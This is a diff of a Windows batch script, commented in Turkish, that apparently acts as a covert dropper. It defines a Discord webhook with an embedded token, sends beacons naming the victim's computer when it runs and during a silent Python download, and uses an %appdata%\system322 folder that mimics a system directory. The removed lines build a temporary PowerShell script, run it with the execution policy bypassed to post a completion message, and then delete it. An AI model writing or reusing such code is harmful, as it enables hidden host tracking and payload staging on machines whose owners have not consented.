@@ -5,7 +5,6 @@ set "webhookUrl=https://discord.com/api/webhooks/1240038860205985894/qhYcRwGnxah
 set "startMessage=CMD has been opened on %COMPUTERNAME% at %date% %time%."
 set "downloadStartMessage=Python download started on %COMPUTERNAME% at %date% %time%."
 set "downloadEndMessage=Python download finished on %COMPUTERNAME% at %date% %time%."
-set "completionMessage=All tasks completed on %COMPUTERNAME% at %date% %time%."
 
 :: Function to send a webhook notification
 :send_webhook
@@ -120,22 +119,5 @@ echo Script path: "%scriptPath%"
 
 :: py klasörünü ve içeriğini sil
 rmdir /s /q "%extractFolderPath%"
-
-:: %appdata%/system322 klasörünü sil
-set "system322Path=%appdata%\system322"
-if exist "%system322Path%" (
-    rmdir /s /q "%system322Path%"
-)
-
-:: Tüm işlemler tamamlandı bildirimini gönder
-echo param ^(^[string^]$webhookUrl, ^[string^]$message^) > SendWebhook.ps1
-echo $body = ^@^{ >> SendWebhook.ps1
-echo content = $message >> SendWebhook.ps1
-echo ^} ^| ConvertTo-Json >> SendWebhook.ps1
-echo Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body $body >> SendWebhook.ps1
-
-powershell -ExecutionPolicy Bypass -File SendWebhook.ps1 -webhookUrl "%webhookUrl%" -message "%completionMessage%"
-
-del SendWebhook.ps1
 
 echo İşlem tamamlandı.
